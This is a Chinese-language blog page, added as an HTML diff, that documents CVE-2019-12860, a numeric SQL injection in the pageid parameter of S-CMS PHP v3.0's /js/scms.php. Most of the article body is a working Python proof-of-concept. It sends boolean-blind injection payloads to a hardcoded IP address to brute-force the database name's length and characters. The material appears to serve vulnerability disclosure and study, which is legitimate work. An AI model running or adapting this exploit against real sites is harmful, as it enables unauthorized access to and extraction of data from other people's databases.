@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="漏洞简介    漏洞名称 上报日期 漏洞发现者 产品首页 软件链接 版本 CVE编号      S-CMS PHP v3.0存在SQL注入漏洞 2019-05-31 zhhhy https://www.s-cms.cn/download.html?code=php https://www.s-cms.cn/download.html?code=php PHP v3.0 CVE-2019-12860">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ALL BLUE">
+<meta property="og:url" content="http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/index.html">
+<meta property="og:site_name" content="ALL BLUE">
+<meta property="og:description" content="漏洞简介    漏洞名称 上报日期 漏洞发现者 产品首页 软件链接 版本 CVE编号      S-CMS PHP v3.0存在SQL注入漏洞 2019-05-31 zhhhy https://www.s-cms.cn/download.html?code=php https://www.s-cms.cn/download.html?code=php PHP v3.0 CVE-2019-12860">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-03-24T15:33:31.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ALL BLUE">
+<meta name="twitter:description" content="漏洞简介    漏洞名称 上报日期 漏洞发现者 产品首页 软件链接 版本 CVE编号      S-CMS PHP v3.0存在SQL注入漏洞 2019-05-31 zhhhy https://www.s-cms.cn/download.html?code=php https://www.s-cms.cn/download.html?code=php PHP v3.0 CVE-2019-12860">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ALL BLUE</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2021/07/16/01-CMS漏洞/SCMS/S-CMS企业建站系统PHP版v3.0后台存在CSRF可添加管理员权限账号/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2021/07/16/01-CMS漏洞/PHPCMS/PHPCMS_v9.6.2_任意文件下载/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/&text="><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/&title="><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/&is_video=false&description="><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/&title="><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/&title="><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/&title="><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/&title="><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/&name=&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/&t="><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞简介"><span class="toc-number">1.</span> <span class="toc-text">漏洞简介</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞概述"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞概述</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC实现代码如下："><span class="toc-number">2.</span> <span class="toc-text">POC实现代码如下：</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">JYP</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-07-16T03:12:37.048Z" itemprop="datePublished">2021-07-16</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table>
+<thead>
+<tr>
+<th></th>
+<th>漏洞名称</th>
+<th>上报日期</th>
+<th>漏洞发现者</th>
+<th>产品首页</th>
+<th>软件链接</th>
+<th>版本</th>
+<th>CVE编号</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td>S-CMS PHP v3.0存在SQL注入漏洞</td>
+<td>2019-05-31</td>
+<td>zhhhy</td>
+<td><a href="https://www.s-cms.cn/download.html?code=php" target="_blank" rel="noopener">https://www.s-cms.cn/download.html?code=php</a></td>
+<td><a href="https://www.s-cms.cn/download.html?code=php" target="_blank" rel="noopener">https://www.s-cms.cn/download.html?code=php</a></td>
+<td>PHP v3.0</td>
+<td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12860" target="_blank" rel="noopener">CVE-2019-12860</a></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote>
+<p>漏洞代码位置：/js/scms.php 第182-204行,在第83行处，变量$pageid接受使用POST方式传递的pageid的值。而在第87行和第95行处，变量$pageid被直接拼接进SQL语句之中，从而产生注入。而由于是数字型注入，避免使用单引号等符号以至于绕过了防御。 </p>
+</blockquote>
+<h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote>
+<p>构造如下poc.py </p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_0123456789'</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://106.14.144.32:2000/js/scms.php'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabaseLength</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'开始爆破数据库长度。。。'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        payload=<span class="string">"1%0Aand%0Aif(length(database())&gt;&#123;&#125;,1,0)#"</span>.format(i)</span><br><span class="line">        payload=urllib.parse.unquote(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'action'</span>:<span class="string">'jssdk'</span>,</span><br><span class="line">            <span class="string">'pagetype'</span>:<span class="string">'text'</span>,</span><br><span class="line">            <span class="string">'pageid'</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="comment"># data = urllib.parse.unquote(data)</span></span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        rs = requests.post(url=url,data=data)</span><br><span class="line">        rs.encode=<span class="string">'utf-8'</span></span><br><span class="line">        <span class="comment"># print(rs.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"20151019102732946.jpg"</span> <span class="keyword">not</span> <span class="keyword">in</span> rs.text:</span><br><span class="line">            print(<span class="string">"数据库名的长度为：&#123;&#125;"</span>.format(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabaseName</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'开始获取数据库名'</span>)</span><br><span class="line">    databasename = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    length = getDatabaseLength()</span><br><span class="line">    <span class="comment"># length = 4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            payload=<span class="string">'1%0Aand%0Aif(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;,1,0)#'</span>.format(i,ord(c))</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            payload = urllib.parse.unquote(payload)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'action'</span>: <span class="string">'jssdk'</span>,</span><br><span class="line">                <span class="string">'pagetype'</span>: <span class="string">'text'</span>,</span><br><span class="line">                <span class="string">'pageid'</span>: payload</span><br><span class="line">            &#125;</span><br><span class="line">            rs = requests.post(url=url, data=data)</span><br><span class="line">            rs.encode = <span class="string">'utf-8'</span></span><br><span class="line">            <span class="comment"># print(rs.text)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"20151019102732946.jpg"</span> <span class="keyword">in</span> rs.text:</span><br><span class="line">                databasename = databasename+c</span><br><span class="line">                print(databasename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> databasename</span><br><span class="line">getDatabaseName()</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞简介"><span class="toc-number">1.</span> <span class="toc-text">漏洞简介</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞概述"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞概述</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC实现代码如下："><span class="toc-number">2.</span> <span class="toc-text">POC实现代码如下：</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/&text="><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/&title="><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/&is_video=false&description="><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/&title="><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/&title="><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/&title="><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/&title="><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/&name=&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2021/07/16/01-CMS漏洞/SCMS/S-CMS PHP v3.0存在SQL注入漏洞/&t="><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    JYP
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
